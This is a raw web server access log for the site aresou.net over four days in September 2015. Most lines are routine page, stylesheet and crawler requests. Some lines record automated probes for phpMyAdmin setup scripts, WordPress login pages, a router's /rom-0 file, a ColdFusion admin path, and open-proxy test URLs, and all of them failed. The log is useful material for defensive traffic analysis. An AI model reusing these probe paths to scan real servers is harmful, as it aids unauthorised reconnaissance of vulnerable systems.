73.202.164.195 - - [03/Sep/2015:00:31:14 -0400] "GET /static/css/aresou.css HTTP/1.1" 304 0 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
73.202.164.195 - - [03/Sep/2015:00:31:18 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
73.202.164.195 - - [03/Sep/2015:00:31:18 -0400] "GET /static/css/aresou.css HTTP/1.1" 200 462 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
73.202.164.195 - - [03/Sep/2015:00:31:18 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "http://aresou.net/" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
54.67.50.46 - - [03/Sep/2015:01:26:05 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.108.148 - - [03/Sep/2015:02:42:11 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.107.211 - - [03/Sep/2015:04:12:28 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
198.101.238.203 - - [03/Sep/2015:04:51:23 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.71 Safari/534.24"
192.237.216.89 - - [03/Sep/2015:05:06:21 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.71 Safari/534.24"
54.153.111.210 - - [03/Sep/2015:05:20:26 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
52.8.225.40 - - [03/Sep/2015:06:36:26 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
52.8.225.40 - - [03/Sep/2015:07:56:35 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.67.50.46 - - [03/Sep/2015:09:02:32 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.75.133 - - [03/Sep/2015:10:07:21 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.107.211 - - [03/Sep/2015:11:09:30 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
141.212.122.122 - - [03/Sep/2015:11:26:23 -0400] "GET /x HTTP/1.1" 400 181 "-" "Telesphoreo"
54.67.62.180 - - [03/Sep/2015:12:09:52 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.111.210 - - [03/Sep/2015:13:35:42 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.67.62.180 - - [03/Sep/2015:14:26:50 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.108.148 - - [03/Sep/2015:15:25:36 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.107.211 - - [03/Sep/2015:16:25:10 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
52.8.225.40 - - [03/Sep/2015:17:28:40 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.67.97.123 - - [03/Sep/2015:18:31:23 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
119.42.83.145 - - [03/Sep/2015:19:23:58 -0400] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 14 "-" "-"
119.42.83.145 - - [03/Sep/2015:19:24:04 -0400] "GET /pma/scripts/setup.php HTTP/1.1" 404 14 "-" "-"
119.42.83.145 - - [03/Sep/2015:19:24:10 -0400] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 14 "-" "-"
52.8.225.40 - - [03/Sep/2015:19:34:13 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
46.172.71.251 - - [03/Sep/2015:20:32:26 -0400] "GET /rom-0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.153.111.210 - - [03/Sep/2015:20:34:47 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.108.148 - - [03/Sep/2015:21:57:59 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [03/Sep/2015:22:46:40 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
192.187.110.98 - - [03/Sep/2015:22:52:34 -0400] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
54.153.71.67 - - [03/Sep/2015:23:11:37 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [03/Sep/2015:23:54:39 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [04/Sep/2015:00:58:06 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
195.154.165.177 - - [04/Sep/2015:01:56:24 -0400] "GET / HTTP/1.1" 200 2930 "-" "Mozilla/5.0 (Windows NT 5.1)"
54.153.74.0 - - [04/Sep/2015:02:00:22 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
141.212.122.194 - - [04/Sep/2015:03:32:54 -0400] "GET / HTTP/1.1" 200 2930 "-" "Mozilla/5.0 zgrab/0.x"
54.153.15.150 - - [04/Sep/2015:04:29:23 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.3.184 - - [04/Sep/2015:05:39:15 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
61.135.190.201 - - [04/Sep/2015:06:18:50 -0400] "GET / HTTP/1.0" 200 2930 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
61.135.190.72 - - [04/Sep/2015:06:18:51 -0400] "GET /static/css/aresou.css HTTP/1.0" 200 462 "http://168.235.85.21/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
54.153.3.184 - - [04/Sep/2015:07:03:34 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [04/Sep/2015:07:54:40 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [04/Sep/2015:09:03:16 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.68.49 - - [04/Sep/2015:09:58:13 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
93.174.95.64 - - [04/Sep/2015:10:51:00 -0400] "GET //wp-login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
93.174.95.64 - - [04/Sep/2015:10:51:00 -0400] "GET /blog//wp-login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
93.174.95.64 - - [04/Sep/2015:10:51:00 -0400] "GET /wordpress//wp-login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
93.174.95.64 - - [04/Sep/2015:10:51:01 -0400] "GET /wp//wp-login.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (X11; U; Linux i686; pt-BR; rv:1.9.0.15) Gecko/2009102815 Ubuntu/9.04 (jaunty) Firefox/3.0.15"
54.153.73.47 - - [04/Sep/2015:10:59:36 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [04/Sep/2015:12:02:07 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
182.118.54.16 - - [04/Sep/2015:12:19:57 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
54.153.73.47 - - [04/Sep/2015:13:15:27 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [04/Sep/2015:14:20:43 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
91.196.50.33 - - [04/Sep/2015:14:34:21 -0400] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
185.25.151.159 - - [04/Sep/2015:14:34:35 -0400] "GET http://testp2.czar.bielawa.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
54.153.64.34 - - [04/Sep/2015:15:08:04 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.187.12.191 - - [04/Sep/2015:15:28:16 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
54.153.68.49 - - [04/Sep/2015:16:09:16 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [04/Sep/2015:17:28:38 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
121.42.210.61 - - [04/Sep/2015:17:55:07 -0400] "GET / HTTP/1.1" 200 2930 "-" "-"
121.42.210.61 - - [04/Sep/2015:17:55:08 -0400] "" 400 0 "-" "-"
182.118.60.82 - - [04/Sep/2015:18:05:58 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
54.153.71.67 - - [04/Sep/2015:18:29:05 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.20.36 - - [04/Sep/2015:19:33:35 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [04/Sep/2015:20:25:32 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.71.67 - - [04/Sep/2015:21:32:51 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [04/Sep/2015:22:38:46 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [04/Sep/2015:23:33:10 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.59.142 - - [05/Sep/2015:00:10:53 -0400] "GET / HTTP/1.0" 200 2930 "-" "Mozilla/5.0 (Windows NT 6.3; rv:36.0 Gecko/20100101 Firefox/36.0"
180.76.15.29 - - [05/Sep/2015:00:26:05 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
54.153.27.59 - - [05/Sep/2015:00:34:17 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [05/Sep/2015:01:46:38 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [05/Sep/2015:03:30:01 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [05/Sep/2015:04:31:57 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [05/Sep/2015:05:47:01 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.20.36 - - [05/Sep/2015:06:45:45 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
93.174.93.33 - - [05/Sep/2015:07:13:07 -0400] "GET / HTTP/1.0" 200 2930 "-" "-"
54.153.3.184 - - [05/Sep/2015:07:47:19 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
86.9.125.118 - - [05/Sep/2015:08:36:46 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 14 "-" "Airmail 2.1 rv:303 (Macintosh; Mac OS X 10.10.5; en_GB)"
86.9.125.118 - - [05/Sep/2015:08:36:46 -0400] "GET / HTTP/1.1" 200 892 "-" "Airmail 2.1 rv:303 (Macintosh; Mac OS X 10.10.5; en_GB)"
86.9.125.118 - - [05/Sep/2015:08:36:46 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "-" "Airmail 2.1 rv:303 (Macintosh; Mac OS X 10.10.5; en_GB)"
66.249.93.170 - - [05/Sep/2015:08:36:47 -0400] "GET / HTTP/1.1" 200 892 "-" "Google favicon"
66.249.93.170 - - [05/Sep/2015:08:36:47 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "-" "Google favicon"
54.153.68.49 - - [05/Sep/2015:08:52:01 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
89.178.50.51 - - [05/Sep/2015:08:59:51 -0400] "GET / HTTP/1.1" 200 892 "http://yandex.ru/clck/jsredir?from=yandex.ru%3Bsearch%3Bweb%3B%3B&text=&etext=802.YZLVcQnSNtmxF9XqL_91F6JrBGR7A0xA-4Y9qQKIUBI.17d11531b9b65041e1b0aa4f1832ca6782f90f78&uuid=&state=AiuY0DBWFJ4ePaEse6rgeAjgs2pI3DW9J0KiE5XNXd0dp0ZMwFHoviUoYa6nzP7MSi3gOS8hVmK0DQTYX7sDz_bPdh2_WFjW_Or2Gs6s9kFoGQSFnG-LZf-bcz9J7xGpFK9X7fwr5n883SHRUX61Mo1ykPXRI3QCpjNJibu3hiHDnd0UkTlgSThzZOCOdE_fS0BQSgR9vio9HXh79FPCCQ&data=UlNrNmk5WktYejR0eWJFYk1LdmtxdnE2bmdwOTlhYXNFdHAwUHJBRDg3ZFFRajdiaEVKeWg4bXI5dXM1cHJiYzZKRjdidWZhMElxQU9CM1BBc2ZoUl8tTV9EUllfSllH&b64e=2&sign=9df373eaff820bc112c961d2825937b5&keyno=0&l10n=ru&cts=1441457613205&mc=1.90420507741" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
89.178.50.51 - - [05/Sep/2015:08:59:51 -0400] "GET /static/css/aresou.css HTTP/1.1" 200 462 "http://aresou.net/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"
54.153.20.36 - - [05/Sep/2015:10:02:47 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [05/Sep/2015:10:57:53 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [05/Sep/2015:12:02:03 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [05/Sep/2015:13:07:36 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.15.150 - - [05/Sep/2015:14:13:01 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [05/Sep/2015:15:12:56 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.71.67 - - [05/Sep/2015:16:24:27 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.68.49 - - [05/Sep/2015:17:27:34 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
40.113.126.174 - - [05/Sep/2015:18:23:40 -0400] "GET /CFIDE/administrator/ HTTP/1.1" 404 14 "-" "-"
61.135.190.201 - - [05/Sep/2015:18:24:02 -0400] "GET / HTTP/1.0" 200 2930 "http://www.baidu.com/s?wd=www" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
61.135.190.199 - - [05/Sep/2015:18:24:03 -0400] "GET /static/css/aresou.css HTTP/1.0" 200 462 "http://168.235.85.21/" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)"
54.153.71.67 - - [05/Sep/2015:18:27:02 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.68.49 - - [05/Sep/2015:19:31:31 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [05/Sep/2015:20:31:32 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
46.172.71.251 - - [05/Sep/2015:21:28:14 -0400] "GET /rom-0 HTTP/1.1" 404 14 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.153.15.150 - - [05/Sep/2015:22:08:54 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.74.0 - - [05/Sep/2015:23:46:20 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [06/Sep/2015:00:50:30 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
185.25.151.159 - - [06/Sep/2015:01:01:22 -0400] "GET http://testp1.piwo.pila.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
54.153.71.67 - - [06/Sep/2015:01:54:44 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
62.210.69.173 - - [06/Sep/2015:02:21:35 -0400] "GET / HTTP/1.1" 200 2930 "-" "Mozilla/5.0 (Windows NT 5.1)"
54.153.20.36 - - [06/Sep/2015:03:14:39 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [06/Sep/2015:04:22:50 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [06/Sep/2015:05:27:16 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [06/Sep/2015:06:41:15 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.68.49 - - [06/Sep/2015:07:45:04 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [06/Sep/2015:08:46:22 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [06/Sep/2015:09:53:49 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [06/Sep/2015:10:53:28 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.27.59 - - [06/Sep/2015:11:55:16 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
45.55.53.207 - - [06/Sep/2015:12:42:12 -0400] "HEAD / HTTP/1.1" 405 0 "http://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
182.118.53.135 - - [06/Sep/2015:12:54:13 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
54.153.3.184 - - [06/Sep/2015:12:58:27 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.20.36 - - [06/Sep/2015:14:05:45 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.64.34 - - [06/Sep/2015:15:06:34 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.187.12.191 - - [06/Sep/2015:15:38:23 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
54.153.27.59 - - [06/Sep/2015:16:08:32 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
71.6.135.131 - - [06/Sep/2015:16:10:56 -0400] "GET / HTTP/1.1" 200 2930 "-" "-"
71.6.135.131 - - [06/Sep/2015:16:10:56 -0400] "GET /robots.txt HTTP/1.1" 404 14 "-" "-"
71.6.135.131 - - [06/Sep/2015:16:10:56 -0400] "GET /sitemap.xml HTTP/1.1" 404 14 "-" "-"
54.153.73.47 - - [06/Sep/2015:17:14:37 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
101.161.155.38 - - [06/Sep/2015:17:40:34 -0400] "GET / HTTP/1.1" 200 892 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
101.161.155.38 - - [06/Sep/2015:17:40:36 -0400] "GET / HTTP/1.1" 200 892 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
101.161.155.38 - - [06/Sep/2015:17:40:53 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 14 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
101.161.155.38 - - [06/Sep/2015:17:40:55 -0400] "GET /favicon.ico HTTP/1.1" 404 14 "-" "Mail/2104 CFNetwork/720.5.7 Darwin/14.5.0 (x86_64)"
54.153.64.34 - - [06/Sep/2015:18:16:23 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
195.154.165.177 - - [06/Sep/2015:18:36:26 -0400] "GET / HTTP/1.1" 200 2930 "-" "Mozilla/5.0 (Windows NT 5.1)"
182.118.54.83 - - [06/Sep/2015:19:06:09 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36"
54.153.64.34 - - [06/Sep/2015:19:24:52 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
54.153.73.47 - - [06/Sep/2015:20:27:07 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
185.49.14.190 - - [06/Sep/2015:21:11:13 -0400] "GET http://testp5.mielno.lubin.pl/testproxy.php HTTP/1.1" 404 14 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
54.153.27.59 - - [06/Sep/2015:21:36:35 -0400] "GET / HTTP/1.1" 200 892 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0"
